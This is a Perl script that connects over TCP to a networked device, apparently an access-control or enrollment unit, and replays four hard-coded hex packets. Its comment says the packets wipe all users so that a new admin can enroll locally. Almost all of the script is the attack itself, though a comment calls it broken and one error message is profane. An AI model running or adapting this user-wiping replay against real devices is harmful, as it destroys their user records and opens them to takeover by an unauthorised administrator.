use IO::Socket::INET;
use Time::HiRes qw(usleep);
use warnings;
use strict;
use Socket qw(IPPROTO_TCP);
use String::HexConvert ':all';
#doesn't really seem to autoflush ?
# this script wipes all users in the device so a new admin can enroll locally
# WHY IS THIS BROKEN?

$|=1;
my $sock; my $bla;

$sock = new IO::Socket::INET( PeerHost => "10.10.10.2",PeerPort => "1471",Proto => "tcp") or die "error connecting: $!\n";
binmode($sock); setsockopt($sock,IPPROTO_TCP,Socket::TCP_NODELAY(),1) || die "fuck me sideways: $!";

sub send{ my $data = $_[0]; print $sock hex_to_ascii($data); usleep(250000); }
sub getshort{ print "reading short response\n";$sock->recv($bla,40);usleep(250000);print "response: $bla\n";}
sub getvaried{ print "reading varied response\n";$sock->recv($bla,int($_[0]));print "response: $bla\n"; }


print "sending 1\n";
&send("7B7B3C3CD1B900000100000000000100DA753DA96656A2024D29EB006A9CBC123C0300003E3E7D7D");
getshort();

print "sending 3\n";
&send("7B7B3C3CD1B9000001000000000001004AD0256479E52C9267A26FEC198C8DD31D0300003E3E7D7D");
getshort();

print "sending 5\n";
&send("7B7B3C3CD1B9000001000000000001009C2B63DEF4F496F48CB56322D90969131B0300003E3E7D7D");
getshort();

print "sending 7\n";
&send("7B7B3C3CD1B900000100000000000100A6A82C2359AF5C1D99BFEF0323C92961010300003E3E7D7D");
getshort();
#getvaried(32);
#getvaried(24);

$sock->close;
print "Socket closed\n";
